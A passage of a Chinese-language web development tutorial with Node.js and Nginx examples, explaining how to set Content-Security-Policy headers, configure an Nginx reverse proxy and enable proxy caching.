content&lt;/div&gt;'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126165112534.png" alt=""></p><p><img src="image-20210126165723871.png" alt="重定向"></p><p>​<br>​</p><h3 id="2-9-Content-Security-Policy">2.9 Content-Security-Policy</h3><p><strong>内容安全策略</strong>，为了让网站变得更加的安全</p><ul><li>限制资源获取</li><li>报告资源获取越权</li></ul><p>限制方式：</p><ul><li>default-src限制全局（与链接有关的都可以限制它的作用范围）</li><li>制定资源类型（可以根据特定的资源来限制它的资源范围）</li></ul><p>资源类型（网页上跟链接有关的，需要从外链进行加载内容，都可以进行资源类型的限制）</p><ul><li><p>connect-src（请求发向的地方目标）</p></li><li><p>mainfest-src</p></li><li><p>img-src（图片可以从哪几个网站加载）</p></li><li><p>font-src</p></li><li><p>media-src</p></li><li><p>style-src（样式从哪几个网址加载）</p></li><li><p>frame-src</p></li><li><p>script-src（脚本从哪几个网址加载）</p><p>…</p></li></ul><p>示例代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>      <span class="token string">'Content-Security-Policy'</span><span class="token operator">:</span> <span class="token string">'default-src http: https:'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>This is content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'inline js'</span><span class="token punctuation">)</span> <span class="token comment">// 不希望有inline js</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126171420934.png" alt="禁止执行inline js"></p><p>使用外链的方式加载 js 代码，进行测试，此时可以加载</p><p>设置为只能使用本域名下的  js 代码进行加载，进行测试</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>      <span class="token string">'Content-Security-Policy'</span><span class="token operator">:</span> <span class="token string">'default-src \'self\''</span> <span class="token comment">// 限制所有外链</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/javascript'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'console.log("loaded script")'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>This is content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'inline js'</span><span class="token punctuation">)</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.bootcss.com/jquery/3.3.1/core.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126172831056.png" alt=""></p><p><img src="image-20210126173450739.png" alt="blocked:csp"></p><p>限制表单</p><pre class="line-numbers language-none"><code class="language-none">'Content-Security-Policy': 'default-src \'self\'; form-action \'self\' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210126174415329.png" alt=""></p><p>主动向服务器发请求汇报，可以允许加载（Content-Security-Policy-Report-Only）</p><pre class="line-numbers language-none"><code class="language-none">'Content-Security-Policy': 'default-src \'self\'; form-action \'self\'; report-uri /report'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210126175140576.png" alt=""></p><p>可以通过meta标签使用</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src <span class="token punctuation">'</span>self<span class="token punctuation">'</span>; form-action <span class="token punctuation">'</span>self<span class="token punctuation">'</span>;<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考文章：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">CSP</a></p><p>​</p><p>​</p><p>​</p><h2 id="3-Nginx代理基础">3. Nginx代理基础</h2><h3 id="3-1-Nginx安装">3.1 Nginx安装</h3><p>Nginx的作用： 通过一台物理机器可以运行多个服务，节省资源，从而高效地利用计算机</p><p><a href="http://nginx.org/en/download.html">Nginx下载</a></p><img src="image-20210125154517050.png" alt="下载页面" style="zoom: 70%;"><p>直接下载这个页面上的windows压缩包，然后解压，在解压的文件夹中打开git bash来运行nginx</p><img src="image-20210125155122837.png" alt="启动服务" style="zoom:90%;"><img src="image-20210125155100880.png" alt="启动成功" style="zoom:60%;"><p>​<br>​</p><h3 id="3-2-Nginx代理配置">3.2 Nginx代理配置</h3><p>在nginx软件下新建一个servers并创建一个test.conf文件，并且修改<code>nginx.conf</code>，引入<code>test.conf</code>文件：</p><p><code>test.conf</code>：</p><pre class="line-numbers language-none"><code class="language-none">server {  listen      80;  server_name test.com;   location /  {    proxy_pass http://127.0.0.1:8887;    # proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>nginx.conf</code>：（nginx-1.19.6\conf\nginx.conf）</p><pre class="line-numbers language-none"><code class="language-none">include     servers/*.conf;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动server服务</p><p><code>server.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> zlib <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'zlib'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token punctuation">)</span>  <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>    <span class="token string">'Content-Encoding'</span><span class="token operator">:</span> <span class="token string">'gzip'</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span><span class="token function">gzipSync</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/form<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>application/x-www-form-urlencoded<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span>    form<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">var</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span>      <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/form'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        method<span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>        body<span class="token operator">:</span> formData      <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过<code>test.com</code>来访问代理的网址</p><img src="image-20210126183044339.png" alt="成功" style="zoom:80%;"><p>补充：在<code>test.conf</code>文件中如果是否设置<code>proxy_set_header Host $host;</code>在服务端会返回会不同</p><p><img src="image-20210126184400512.png" alt=""></p><blockquote><p>host经过中间代理的层级后被修改</p></blockquote><p>​<br>​</p><h3 id="3-3-Nginx代理缓存">3.3 Nginx代理缓存</h3><p>代理缓存是在代理设置的，所有每一个新请求都会经过代理。在浏览器客户端，只要第一个用户请求了，代理服务器缓存之后，其他用户都可以使用代理服务器的缓存</p><p>修改<code>test.conf</code>：</p><p><img src="20190105210021993.png" alt=""></p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;   server {  listen      80;  server_name test.com;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8888;    proxy_set_header Host $host;  }} server {  listen      80;  server_name a.test.com;   location /  {    proxy_pass http://127.0.0.1:8888;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新建一个文件夹，并创建<code>server.js</code>和<code>test.html</code>文件</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">wait</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">seconds</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> seconds <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/data'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Cache-Control'</span><span class="token operator">:</span> <span class="token string">'max-age=3, s-maxage=20'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span 